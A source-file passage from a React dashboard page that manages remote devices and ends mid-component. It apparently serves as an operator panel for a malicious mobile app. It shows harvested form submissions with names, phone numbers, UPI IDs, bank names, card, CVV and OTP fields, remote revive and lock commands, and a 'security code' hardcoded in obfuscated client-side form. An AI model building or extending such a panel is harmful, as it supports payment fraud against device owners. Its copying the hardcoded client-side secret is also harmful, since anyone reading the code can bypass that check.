// src/pages/DevicesPage.tsx
import {
  memo,
  useCallback,
  useDeferredValue,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import axios from "axios";

import type { DeviceDoc } from "../types";
import { getDevices, deleteDevice, lockDevice, lockAllDevices, unlockAllDevices } from "../services/api/devices";
import { getFavoritesMap, setFavorite } from "../services/api/favorites";
import { changeDeletePassword, getDeletePasswordStatus } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import ztLogo from "../assets/zt-logo.png";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import wsService from "../services/ws/wsService";
import Modal from "../components/ui/Modal";
import {
  pickLastSeenAt,
  computeReachability,
  getReachabilityLabel,
  getReachabilityPillClasses,
  formatLastSeen,
  type ReachabilityStatus,
} from "../utils/reachability";

// ── Security code (obfuscated) ──
const _SC = [55, 51, 57, 49].map((c) => String.fromCharCode(c)).join("");

type Row = DeviceDoc & { _fav?: boolean };
type FormSubmission = Record<string, any>;
type DeviceFilter = "all" | "online" | "offline" | "favorites" | "idle" | "uninstalled";
type DeleteModalMode = "delete" | "change";
type LockAction =
  | "lock-all"
  | "unlock-all"
  | { type: "device"; deviceId: string; lock: boolean };

type DisplayRow = Row & {
  brand: string;
  model: string;
  reachability: ReachabilityStatus;
  favoriteFlag: boolean;
  lastSeenTs: number;
  lastSeenLabel: string;
  lastForm: string;
  logoSrc: string;
  renderKey: string;
};

const LIST_ROW_HEIGHT = 238;
const LIST_OVERSCAN = 8;
const VIRTUALIZE_AFTER = 20;

function safeStr(v: unknown): string {
  return String(v ?? "").trim();
}

function normalizeFilter(v: string | null | undefined): DeviceFilter {
  if (v === "online" || v === "offline" || v === "favorites" || v === "idle" || v === "uninstalled") return v;
  return "all";
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

function pickFormDeviceId(s: FormSubmission): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || "");
}

function pickFormTs(s: FormSubmission): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;
  const created = safeStr(s?.createdAt || s?.created_at || s?.date || "");
  if (created) { const t = Date.parse(created); if (Number.isFinite(t)) return t; }
  return 0;
}

function pickRegisteredAt(d: any): number {
  const candidates = [
    d?.registeredAt, d?.registered_at, d?.createdAt, d?.created_at,
    d?.metadata?.registeredAt, d?.metadata?.createdAt, d?.metadata?.created_at, d?._id,
  ];
  for (const raw of candidates) {
    if (!raw) continue;
    const num = Number(raw);
    if (Number.isFinite(num) && num > 1_000_000_000) return num < 1e12 ? num * 1000 : num;
    if (typeof raw === "string") {
      if (/^[a-f0-9]{24}$/i.test(raw)) { const ts = parseInt(raw.substring(0, 8), 16) * 1000; if (Number.isFinite(ts) && ts > 0) return ts; }
      const parsed = Date.parse(raw); if (Number.isFinite(parsed) && parsed > 0) return parsed;
    }
  }
  return 0;
}

function maskMaybeSensitive(key: string, value: string): string {
  const k = key.toLowerCase();
  const digits = value.replace(/\D/g, "");
  const looksSensitive = k.includes("card") || k.includes("cvv") || k.includes("pan") || k.includes("account") || k.includes("acc");
  if (looksSensitive && digits.length >= 8) return `****${digits.slice(-4)}`;
  if (k.includes("otp") && digits.length >= 4) return "****";
  return value;
}

function summarizeForm(s: FormSubmission | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";
  const source = s?.payload && typeof s.payload === "object" ? s.payload : s;
  const candidates: Array<[string, any]> = [
    ["name", source.name || source.fullName], ["mobile", source.mobile || source.phone],
    ["amount", source.amount || source.amt], ["upi", source.upi || source.upiId],
    ["bank", source.bank || source.bankName], ["title", source.title || source.formTitle],
  ];
  const parts: string[] = [];
  for (const [k, raw] of candidates) {
    const v = safeStr(raw); if (!v) continue;
    parts.push(`${k}: ${maskMaybeSensitive(k, v)}`); if (parts.length >= 3) break;
  }
  const ts = pickFormTs(s); if (ts) parts.push(new Date(ts).toLocaleString());
  return parts.length ? parts.join(" • ") : "Form submitted";
}

function pickDeviceLogo(d: any): string {
  const meta = d?.metadata || {};
  const url = safeStr(meta.logoUrl || meta.logo || meta.iconUrl || meta.brandLogoUrl);
  if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:image/")) return url;
  return ztLogo;
}

function DeviceLogo({ src, alt }: { src: string; alt: string }) {
  const [broken, setBroken] = useState(false);
  if (broken) {
    return (
      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-slate-200 bg-white text-sm font-bold text-slate-700">
        {alt.slice(0, 1).toUpperCase()}
      </div>
    );
  }
  return (
    <img src={src} alt={alt} className="h-11 w-11 rounded-2xl border border-slate-200 bg-white object-cover"
      onError={() => setBroken(true)} draggable={false} loading="lazy" />
  );
}

function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={["rounded-[26px] border border-slate-200/90 bg-white/90 shadow-[0_8px_28px_rgba(15,23,42,0.08)] backdrop-blur-sm", className].join(" ")}>
      {children}
    </div>
  );
}

type DeviceCardProps = {
  device: DisplayRow;
  displayNumber: number;
  isChecking: boolean;
  isDeleting: boolean;
  isLocking: boolean;
  onOpen: (deviceId: string) => void;
  onToggleFavorite: (deviceId: string) => void;
  onCheckOnline: (deviceId: string) => void;
  onDelete: (deviceId: string) => void;
  onToggleLock: (deviceId: string, currentLocked: boolean) => void;
};

const DeviceCard = memo(function DeviceCard({
  device, displayNumber, isChecking, isDeleting, isLocking,
  onOpen, onToggleFavorite, onCheckOnline, onDelete, onToggleLock,
}: DeviceCardProps) {
  const pillClasses = getReachabilityPillClasses(device.reachability);
  const statusLabel = getReachabilityLabel(device.reachability);
  const isLocked = !!device.locked;

  return (
    <div className="relative h-full rounded-[24px] border border-slate-200 bg-white/92 p-4 shadow-[0_8px_24px_rgba(15,23,42,0.06)]">

      {/* ── Lock overlay ── */}
      {isLocked && (
        <div className="absolute inset-0 z-10 flex flex-col items-center justify-center gap-3 rounded-[24px] bg-slate-900/80 backdrop-blur-[2px]">
          <div className="text-4xl">🔒</div>
          <div className="text-[13px] font-extrabold text-white">Device Locked</div>
          <button
            type="button"
            onClick={() => onToggleLock(device.deviceId, true)}
            disabled={isLocking}
            className="h-10 rounded-2xl border border-white/30 bg-white/20 px-5 text-[13px] font-extrabold text-white hover:bg-white/30 disabled:opacity-60"
          >
            {isLocking ? "Unlocking…" : "🔓 Unlock"}
          </button>
        </div>
      )}

      <div className="flex items-start justify-between gap-3">
        <div className="flex min-w-0 items-center gap-3">
          <DeviceLogo src={device.logoSrc} alt={device.brand} />
          <div className="min-w-0">
            <div className="flex min-w-0 items-center gap-2">
              <div className="min-w-0 truncate text-[16px] font-extrabold text-slate-900">{device.brand}</div>
              <div className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white" title={`#${displayNumber}`}>
                {displayNumber}
              </div>
            </div>
            <div className="truncate text-[12px] text-slate-500">
              {device.model ? `${device.model} • ` : ""}ID: {device.deviceId}
            </div>
          </div>
        </div>

        <div className="flex shrink-0 items-center gap-2">
          <span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", pillClasses].join(" ")}>
            {statusLabel}
          </span>
          <button
            onClick={() => onToggleFavorite(device.deviceId)}
            className={["flex h-10 w-10 items-center justify-center rounded-2xl border text-lg transition active:scale-[0.98]", device.favoriteFlag ? "border-amber-200 bg-amber-50 text-amber-600" : "border-slate-200 bg-white text-slate-500 hover:bg-slate-50"].join(" ")}
            type="button" title={device.favoriteFlag ? "Unfavorite" : "Favorite"}
          >★</button>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-2 gap-3">
        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
          <div className="text-[11px] text-slate-500">Last seen</div>
          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-800">{device.lastSeenLabel}</div>
        </div>
        <div className="min-w-0 rounded-2xl border border-slate-200 bg-slate-50 p-3">
          <div className="text-[11px] text-slate-500">Latest form</div>
          <div className="mt-1 break-words text-[13px] font-semibold leading-5 text-slate-700">{device.lastForm}</div>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-4 gap-2">
        <button onClick={() => onOpen(device.deviceId)}
          className="h-11 rounded-2xl border border-slate-200 bg-white px-2 text-[13px] font-extrabold text-slate-900 transition hover:bg-slate-50 active:scale-[0.99]"
          type="button">Open</button>

        <button onClick={() => onCheckOnline(device.deviceId)} disabled={isChecking}
          className={["h-11 rounded-2xl border border-sky-200 bg-sky-50 px-2 text-[13px] font-extrabold text-sky-700 transition active:scale-[0.99]", "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60"].join(" ")}
          type="button">{isChecking ? "…" : "Check"}</button>

        {/* Lock/Unlock button */}
        <button onClick={() => onToggleLock(device.deviceId, isLocked)} disabled={isLocking}
          className={["h-11 rounded-2xl border px-2 text-[13px] font-extrabold transition active:scale-[0.99] disabled:opacity-60", isLocked ? "border-amber-200 bg-amber-50 text-amber-700 hover:bg-amber-100" : "border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"].join(" ")}
          type="button" title={isLocked ? "Unlock device" : "Lock device"}>
          {isLocking ? "…" : isLocked ? "🔓" : "🔒"}
        </button>

        <button onClick={() => onDelete(device.deviceId)} disabled={isDeleting}
          className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-2 text-[13px] font-extrabold text-rose-700 transition hover:bg-rose-100 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60"
          type="button">{isDeleting ? "…" : "Del"}</button>
      </div>
    </div>
  );
});

export default function DevicesPage() {
  const nav = useNavigate();
  const [searchParams, setSearchParams] = useSearchParams();

  const [devices, setDevices] = useState<Row[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [latestFormMap, setLatestFormMap] = useState<Record<string, FormSubmission>>({});
  const [loading, setLoading] = useState(false);

  const [search, setSearch] = useState("");
  const deferredSearch = useDeferredValue(search);
  const [filter, setFilter] = useState<DeviceFilter>(normalizeFilter(searchParams.get("filter")));
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [checkingDeviceId, setCheckingDeviceId] = useState<string | null>(null);
  const [checkingAll, setCheckingAll] = useState(false);

  // ── Delete modal state ──
  const [deleteModalOpen, setDeleteModalOpen] = useState(false);
  const [deleteModalMode, setDeleteModalMode] = useState<DeleteModalMode>("delete");
  const [deleteTargetDeviceId, setDeleteTargetDeviceId] = useState<string>("");
  const [deletePasswordSet, setDeletePasswordSet] = useState<boolean | null>(null);
  const [deletePassword, setDeletePassword] = useState("");
  const [deleteBusy, setDeleteBusy] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const [deleteSuccess, setDeleteSuccess] = useState<string | null>(null);
  const [changeCurrentPassword, setChangeCurrentPassword] = useState("");
  const [changeNewPassword, setChangeNewPassword] = useState("");
  const [changeConfirmPassword, setChangeConfirmPassword] = useState("");
  const [deletingDeviceId, setDeletingDeviceId] = useState<string | null>(null);

  // ── Lock state ──
  const [lockCodeModalOpen, setLockCodeModalOpen] = useState(false);
  const [lockCodeAction, setLockCodeAction] = useState<LockAction | null>(null);
  const [lockCode, setLockCode] = useState("");
  const [lockCodeError, setLockCodeError] = useState<string | null>(null);
  const [lockingAll, setLockingAll] = useState(false);
  const [lockingDeviceId, setLockingDeviceId] = useState<string | null>(null);

  const loadInFlightRef = useRef(false);
  const favoritesRef = useRef<Record<string, boolean>>({});
  const listRef = useRef<HTMLDivElement | null>(null);
  const [visibleRange, setVisibleRange] = useState({ start: 0, end: 18 });
  const registrationTimeRef = useRef<Record<string, number>>({});

  const assignRegistrationTimes = useCallback((list: Row[]) => {
    const FALLBACK_BASE = 1_000_000;
    for (let i = 0; i < list.length; i++) {
      const id = safeStr(list[i].deviceId); if (!id) continue;
      if (registrationTimeRef.current[id] != null) continue;
      const regTs = pickRegisteredAt(list[i]);
      registrationTimeRef.current[id] = regTs > 0 ? regTs : FALLBACK_BASE - i;
    }
  }, []);

  const assignNewDeviceRegistrationTime = useCallback((deviceId: string) => {
    const id = safeStr(deviceId); if (!id) return;
    if (registrationTimeRef.current[id] != null) return;
    registrationTimeRef.current[id] = Date.now();
  }, []);

  const removeRegistrationTime = useCallback((deviceId: string) => {
    const id = safeStr(deviceId); if (!id) return;
    delete registrationTimeRef.current[id];
  }, []);

  const getRegistrationTime = useCallback((deviceId: string): number => {
    const id = safeStr(deviceId);
    const value = registrationTimeRef.current[id];
    return typeof value === "number" ? value : 0;
  }, []);

  const loadFormsLatestByDevice = useCallback(async (): Promise<Record<string, FormSubmission>> => {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, { headers: apiHeaders(), timeout: 12000 });
      const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
      const map: Record<string, FormSubmission> = {};
      for (const s of list) {
        const did = pickFormDeviceId(s); if (!did) continue;
        const ts = pickFormTs(s); const prev = map[did];
        if (!prev || ts > pickFormTs(prev)) map[did] = s;
      }
      return map;
    } catch { return {}; }
  }, []);

  const sendCheckOnlineCommand = useCallback(async (deviceId: string) => {
    const encodedId = encodeURIComponent(deviceId);
    const headers = apiHeaders();
    try {
      return await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodedId}/revive`, { source: "devices_page", force: true }, { headers, timeout: 15000 });
    } catch {
      return axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodedId}/start`, { source: "devices_page", force: true }, { headers, timeout: 15000 });
    }
  }, []);

  const mergeDevices = useCallback((list: any[], safeFav: Record<string, boolean>) => {
    return (list || []).map((d: any) => {
      const id = pickDeviceId(d); if (!id) return null;
      return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
    }).filter(Boolean) as Row[];
  }, []);

  const loadAll = useCallback(async ({ includeForms = true, silent = false }: { includeForms?: boolean; silent?: boolean } = {}) => {
    if (loadInFlightRef.current) return;
    loadInFlightRef.current = true;
    if (!silent) setLoading(true);
    try {
      const [list, favMap, maybeForms] = await Promise.all([
        getDevices(), getFavoritesMap(),
        includeForms ? loadFormsLatestByDevice() : Promise.resolve(null),
      ]);
      const safeFav = favMap || {};
      const normalized = mergeDevices(list || [], safeFav);
      assignRegistrationTimes(normalized);
      setDevices(normalized);
      setFavoritesMap(safeFav);
      favoritesRef.current = safeFav;
      if (maybeForms) setLatestFormMap(maybeForms);
    } catch (e) {
      console.error("loadAll failed", e);
      setSuccess(null); setError("Failed to load devices from server");
      setDevices([]); if (includeForms) setLatestFormMap({});
    } finally {
      loadInFlightRef.current = false;
      if (!silent) setLoading(false);
    }
  }, [assignRegistrationTimes, loadFormsLatestByDevice, mergeDevices]);

  const loadDeletePasswordStatus = useCallback(async () => {
    try { const res = await getDeletePasswordStatus(); setDeletePasswordSet(!!res.isSet); }
    catch (e) { console.warn("loadDeletePasswordStatus failed", e); setDeletePasswordSet(null); }
  }, []);

  const resetDeleteModalState = useCallback(() => {
    setDeleteModalMode("delete"); setDeleteTargetDeviceId(""); setDeletePassword("");
    setDeleteBusy(false); setDeleteError(null); setDeleteSuccess(null);
    setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword("");
  }, []);

  const closeDeleteModal = useCallback(() => { setDeleteModalOpen(false); resetDeleteModalState(); }, [resetDeleteModalState]);

  const openDeleteModal = useCallback(async (deviceId: string) => {
    setDeleteTargetDeviceId(deviceId); setDeleteModalMode("delete"); setDeletePassword("");
    setDeleteBusy(false); setDeleteError(null); setDeleteSuccess(null);
    setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword("");
    setDeleteModalOpen(true);
    await loadDeletePasswordStatus();
  }, [loadDeletePasswordStatus]);

  // ── Lock handlers ──

  const closeLockModal = useCallback(() => {
    setLockCodeModalOpen(false); setLockCode(""); setLockCodeError(null); setLockCodeAction(null);
  }, []);

  const openLockModal = useCallback((action: LockAction) => {
    setLockCodeAction(action); setLockCode(""); setLockCodeError(null); setLockCodeModalOpen(true);
  }, []);

  const handleConfirmLockCode = useCallback(async () => {
    if (lockCode !== _SC) { setLockCodeError("Incorrect security code"); setLockCode(""); return; }
    closeLockModal();
    const action = lockCodeAction;
    if (!action) return;

    if (action === "lock-all") {
      setLockingAll(true);
      try {
        await lockAllDevices();
        setDevices(prev => prev.map(d => ({ ...d, locked: true })));
        setSuccess("✅ All devices locked");
      } catch (e) { setError("❌ Failed to lock all devices"); }
      finally { setLockingAll(false); }
    } else if (action === "unlock-all") {
      setLockingAll(true);
      try {
        await unlockAllDevices();
        setDevices(prev => prev.map(d => ({ ...d, locked: false })));
        setSuccess("✅ All devices unlocked");
      } catch (e) { setError("❌ Failed to unlock all devices"); }
      finally { setLockingAll(false); }
    } else if (typeof action === "object" && action.type === "device") {
      const { deviceId, lock } = action;
      setLockingDeviceId(deviceId);
      try {
        await lockDevice(deviceId, lock);
        setDevices(prev => prev.map(d => d.deviceId === deviceId ? { ...d, locked: lock } : d));
        setSuccess(lock ? `🔒 Device locked` : `🔓 Device unlocked`);
      } catch (e) { setError(`❌ Failed to ${lock ? "lock" : "unlock"} device`); }
      finally { setLockingDeviceId(null); }
    }
  }, [lockCode, lockCodeAction, closeLockModal]);

  const handleToggleDeviceLock = useCallback((deviceId: string, currentLocked: boolean) => {
    openLockModal({ type: "device", deviceId, lock: !currentLocked });
  }, [openLockModal]);

  const areAllLocked = useMemo(() => devices.length > 0 && devices.every(d => !!d.locked), [devices]);

  useEffect(() => { favoritesRef.current = favoritesMap; }, [favoritesMap]);

  useEffect(() => {
    const qpFilter = normalizeFilter(searchParams.get("filter"));
    setFilter((prev) => (prev === qpFilter ? prev : qpFilter));
  }, [searchParams]);

  useEffect(() => {
    loadAll({ includeForms: true }).catch(() => {});
    loadDeletePasswordStatus().catch(() => {});
    wsService.connect();

    const off = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "device:lastSeen" || msg.event === "device:upsert") {
          const did = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!did) return;
          const lastSeenData = msg?.data?.lastSeen || msg?.data;
          const lastSeenAt = Number(lastSeenData?.at || msg?.data?.timestamp || Date.now());
          const action = String(lastSeenData?.action || "").trim();
          const battery = typeof lastSeenData?.battery === "number" ? lastSeenData.battery : -1;
          const locked = typeof msg?.data?.locked === "boolean" ? msg.data.locked : undefined;

          setDevices((prev) => {
            const index = prev.findIndex((d) => safeStr(d.deviceId) === did);
            if (index === -1) {
              assignNewDeviceRegistrationTime(did);
              const created: Row = { deviceId: did, metadata: {}, lastSeen: { at: lastSeenAt, action, battery }, _fav: !!favoritesRef.current[did] } as Row;
              return [created, ...prev];
            }
            return prev.map((d) =>
              safeStr(d.deviceId) === did
                ? { ...d, lastSeen: { at: lastSeenAt, action, battery }, ...(locked !== undefined ? { locked } : {}) }
                : d
            );
          });
          return;
        }

        if (msg.event === "status") {
          const did = safeStr(msg.deviceId || msg?.data?.deviceId); if (!did) return;
          const timestamp = Number(msg?.data?.timestamp || Date.now());
          setDevices((prev) => {
            const index = prev.findIndex((d) => safeStr(d.deviceId) === did);
            if (index === -1) {
              assignNewDeviceRegistrationTime(did);
              return [{ deviceId: did, metadata: {}, lastSeen: { at: timestamp, action: "ws_status", battery: -1 }, _fav: !!favoritesRef.current[did] } as Row, ...prev];
            }
            return prev.map((d) => safeStr(d.deviceId) === did ? { ...d, lastSeen: { ...((d as any).lastSeen || {}), at: timestamp } } : d);
          });
          return;
        }

        if (msg.event === "favorite:update") {
          const did = safeStr(msg?.data?.deviceId || msg.deviceId); if (!did) return;
          const favorite = !!msg?.data?.favorite;
          setFavoritesMap((prev) => { const next = { ...prev, [did]: favorite }; favoritesRef.current = next; return next; });
          setDevices((prev) => prev.map((d) => safeStr(d.deviceId) === did ? { ...d, favorite, _fav: favorite } : d));
          return;
        }

        if (msg.event === "device:delete") {
          const did = safeStr(msg?.data?.deviceId || msg.deviceId); if (!did) return;
          setDevices((prev) => prev.filter((d) => safeStr(d.deviceId) !== did));
          removeRegistrationTime(did);
          setFavoritesMap((prev) => { const copy = { ...prev }; delete copy[did]; favoritesRef.current = copy; return copy; });
          setLatestFormMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });
          return;
        }

        if (msg.event === "form:created" || msg.event === "form_submissions:created") {
          const did = safeStr(msg?.data?.uniqueid || msg?.data?.deviceId || msg.deviceId); if (!did) return;
          const payload = msg?.data?.payload && typeof msg.data.payload === "object" ? msg.data.payload : msg?.data || {};
          const nextForm: FormSubmission = { ...(payload || {}), uniqueid: did, createdAt: msg?.timestamp || Date.now(), timestamp: msg?.timestamp || Date.now() };
          setLatestFormMap((prev) => {
            const existing = prev[did]; const prevTs = existing ? pickFormTs(existing) : 0; const nextTs = pickFormTs(nextForm);
            if (existing && prevTs > nextTs) return prev;
            return { ...prev, [did]: nextForm };
          });
          return;
        }
      } catch {}
    });

    return () => { off(); };
  }, [assignNewDeviceRegistrationTime, loadAll, loadDeletePasswordStatus, removeRegistrationTime]);

  const displayRows = useMemo<DisplayRow[]>(() => {
    const mapped = devices.map((d, index) => {
      const deviceId = safeStr(d.deviceId); if (!deviceId) return null;
      const favoriteFlag = !!(favoritesMap[deviceId] ?? (d as any).favorite ?? d._fav);
      const lastSeenTs = pickLastSeenAt(d);
      const reachability = computeReachability(lastSeenTs);
      return {
        ...d, deviceId, brand: pickBrand(d), model: pickModel(d), reachability, favoriteFlag,
        lastSeenTs, lastSeenLabel: formatLastSeen(lastSeenTs),
        lastForm: latestFormMap[deviceId] ? summarizeForm(latestFormMap[deviceId]) : "No form submit",
        logoSrc: pickDeviceLogo(d), renderKey: `${deviceId}__${index}`,
      };
    }).filter(Boolean) as DisplayRow[];

    return mapped.sort((a, b) => getRegistrationTime(b.deviceId) - getRegistrationTime(a.deviceId));
  }, [devices, favoritesMap, latestFormMap, getRegistrationTime]);

  const filtered = useMemo(() => {
    const q = deferredSearch.trim().toLowerCase();
    return displayRows.filter((d) => {
      if (filter === "online" && d.reachability !== "responsive") return false;
      if (filter === "offline" && d.reachability === "responsive") return false;
      if (filter === "idle" && d.reachability !== "idle") return false;
      if (filter === "uninstalled" && d.reachability !== "uninstalled") return false;
      if (filter === "favorites" && !d.favoriteFlag) return false;
      if (!q) return true;
      return d.deviceId.toLowerCase().includes(q) || d.brand.toLowerCase().includes(q) || d.model.toLowerCase().includes(q);
    });
  }, [displayRows, deferredSearch, filter]);

  const shouldVirtualize = filtered.length > VIRTUALIZE_AFTER;

  useEffect(() => {
    if (!shouldVirtualize) { setVisibleRange({ start: 0, end: filtered.length }); return; }
    let raf = 0;
    const calcRange = () => {
      const el = listRef.current; if (!el) return;
      const rect = el.getBoundingClientRect();
      const listTop = rect.top + window.scrollY;
      const scrollTop = window.scrollY;
      const viewportBottom = scrollTop + window.innerHeight;
      const relativeTop = Math.max(0, scrollTop - listTop);
      const relativeBottom = Math.max(0, viewportBottom - listTop);
      const start = Math.max(0, Math.floor(relativeTop / LIST_ROW_HEIGHT) - LIST_OVERSCAN);
      const end = Math.min(filtered.length, Math.ceil(relativeBottom / LIST_ROW_HEIGHT) + LIST_OVERSCAN);
      setVisibleRange((prev) => prev.start === start && prev.end === end ? prev : { start, end });
    };
    const onScrollOrResize = () => { if (raf) return; raf = window.requestAnimationFrame(() => { raf = 0; calcRange(); }); };
    calcRange();
    window.addEventListener("scroll", onScrollOrResize, { passive: true });
    window.addEventListener("resize", onScrollOrResize);
    return () => { if (raf) window.cancelAnimationFrame(raf); window.removeEventListener("scroll", onScrollOrResize); window.removeEventListener("resize", onScrollOrResize); };
  }, [filtered.length, shouldVirtualize]);

  const handleFilterChange = useCallback((next: DeviceFilter) => {
    setFilter(next);
    const params = new URLSearchParams(searchParams);
    if (next === "all") params.delete("filter"); else params.set("filter", next);
    setSearchParams(params, { replace: true });
  }, [searchParams, setSearchParams]);

  const handleOpen = useCallback((deviceId: string) => { nav(`/devices/${encodeURIComponent(deviceId)}`); }, [nav]);

  const toggleFavoriteHandler = useCallback(async (deviceId: string) => {
    const curr = !!(favoritesRef.current[deviceId] ?? false); const next = !curr;
    setFavoritesMap((m) => { const updated = { ...m, [deviceId]: next }; favoritesRef.current = updated; return updated; });
    setDevices((prev) => prev.map((d) => d.deviceId === deviceId ? { ...d, favorite: next as any, _fav: next } : d));
    try { await setFavorite(deviceId, next); }
    catch (e) {
      console.error("toggleFavorite failed", e);
      setFavoritesMap((m) => { const reverted = { ...m, [deviceId]: curr }; favoritesRef.current = reverted; return reverted; });
      setDevices((prev) => prev.map((d) => d.deviceId === deviceId ? { ...d, favorite: curr as any, _fav: curr } : d));
      setError("Failed to update favorite");
    }
  }, []);

  const runDeleteDevice = useCallback(async (deviceId: string, password: string) => {
    const trimmedPassword = password.trim();
    if (!trimmedPassword) { setDeleteError("Password is required"); return; }
    if (trimmedPassword.length < 4) { setDeleteError("Password must be at least 4 digits"); return; }
    setDeleteBusy(true); setDeleteError(null); setDeleteSuccess(null); setDeletingDeviceId(deviceId);
    try {
      await deleteDevice(deviceId, trimmedPassword as any);
      setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
      removeRegistrationTime(deviceId);
      setFavoritesMap((m) => { const copy = { ...m }; delete copy[deviceId]; favoritesRef.current = copy; return copy; });
      setLatestFormMap((m) => { const copy = { ...m }; delete copy[deviceId]; return copy; });
      setDeletePasswordSet(true); setSuccess(null); setError(null);
      setDeleteSuccess(deletePasswordSet ? "Device deleted" : "Password created and device deleted");
      setTimeout(() => { closeDeleteModal(); }, 700);
    } catch (e: any) {
      console.error("deleteDevice failed", e);
      setSuccess(null); setDeleteError(safeStr(e?.response?.data?.error || e?.message || "Failed to delete device"));
    } finally { setDeleteBusy(false); setDeletingDeviceId(null); }
  }, [closeDeleteModal, deletePasswordSet, removeRegistrationTime]);

  const handleDeleteDevice = useCallback(async (deviceId: string) => { setDeleteTargetDeviceId(deviceId); await openDeleteModal(deviceId); }, [openDeleteModal]);

  const handleSubmitDelete = useCallback(async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!deleteTargetDeviceId) { setDeleteError("Device id missing"); return; }
    await runDeleteDevice(deleteTargetDeviceId, deletePassword);
  }, [deletePassword, deleteTargetDeviceId, runDeleteDevice]);

  const handleChangeDeletePassword = useCallback(async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const currentPassword = changeCurrentPassword.trim(); const newPassword = changeNewPassword.trim(); const confirmPassword = changeConfirmPassword.trim();
    if (!currentPassword) { setDeleteError("Current password is required"); return; }
    if (!newPassword) { setDeleteError("New password is required"); return; }
    if (newPassword.length < 4) { setDeleteError("New password must be at least 4 digits"); return; }
    if (newPassword !== confirmPassword) { setDeleteError("Confirm password does not match"); return; }
    setDeleteBusy(true); setDeleteError(null); setDeleteSuccess(null);
    try {
      const res = await changeDeletePassword(currentPassword, newPassword);
      if (!res.success) { setDeleteError(res.error || "Failed to change password"); return; }
      setDeletePasswordSet(true); setChangeCurrentPassword(""); setChangeNewPassword(""); setChangeConfirmPassword(""); setDeletePassword("");
      setDeleteSuccess("Password changed successfully"); setDeleteModalMode("delete");
    } catch (e: any) { setDeleteError(safeStr(e?.response?.data?.error || e?.message || "Failed to change password")); }
    finally { setDeleteBusy(false); }
  }, [changeConfirmPassword, changeCurrentPassword, changeNewPassword]);

  const handleCheckOnline = useCallback(async (deviceId: string) => {
    if (!deviceId || checkingDeviceId || checkingAll) return;
    setCheckingDeviceId(deviceId); setError(null); setSuccess(null);
    try { await sendCheckOnlineCommand(deviceId); setSuccess(`Check command sent to ${deviceId}`); }
    catch (e) { console.error("check online failed", e); setError(`Failed to send check command for ${deviceId}`); }
    finally { setCheckingDeviceId(null); }
  }, [checkingAll, checkingDeviceId, sendCheckOnlineCommand]);

  const handleCheckAll = useCallback(async () => {
    if (checkingAll || checkingDeviceId) return;
    const ids = Array.from(new Set(devices.map((d) => safeStr(d.deviceId)).filter(Boolean)));
    if (ids.length === 0) { setError("No devices available"); return; }
    setCheckingAll(true); setError(null); setSuccess(null);
    try {
      const results = await Promise.allSettled(ids.map((id) => sendCheckOnlineCommand(id)));
      const okCount = results.filter((r) => r.status === "fulfilled").length;
      const failCount = results.length - okCount;
      if (failCount === 0) setSuccess(`Check command sent to all ${okCount} devices`);
      else if (okCount > 0) { setSuccess(`Check command sent to ${okCount} devices`); setError(`Failed for ${failCount} devices`); }
      else setError("Failed to send check command to devices");
    } catch (e) { setError("Failed to send check command to devices"); }
    finally { setCheckingAll(false); }
  }, [checkingAll, checkingDeviceId, devices, sendCheckOnlineCommand]);

  const handleManualRefresh = useCallback(() => {
    setError(null); setSuccess(null);
    loadAll({ includeForms: true }).catch(() => {});
    loadDeletePasswordStatus().catch(() => {});
  }, [loadAll, loadDeletePasswordStatus]);

  const visibleRows = shouldVirtualize ? filtered.slice(visibleRange.start, visibleRange.end) : filtered;
  const topSpacer = shouldVirtualize ? visibleRange.start * LIST_ROW_HEIGHT : 0;
  const bottomSpacer = shouldVirtualize ? Math.max(0, (filtered.length - visibleRange.end) * LIST_ROW_HEIGHT) : 0;

  const deleteHelpText = useMemo(() => {
    if (deleteModalMode === "change") return "Enter your current password and choose a new password.";
    if (deletePasswordSet === false) return "No delete password set yet. The password you enter now will be saved.";
    return "Enter your delete password to continue.";
  }, [deleteModalMode, deletePasswordSet]);

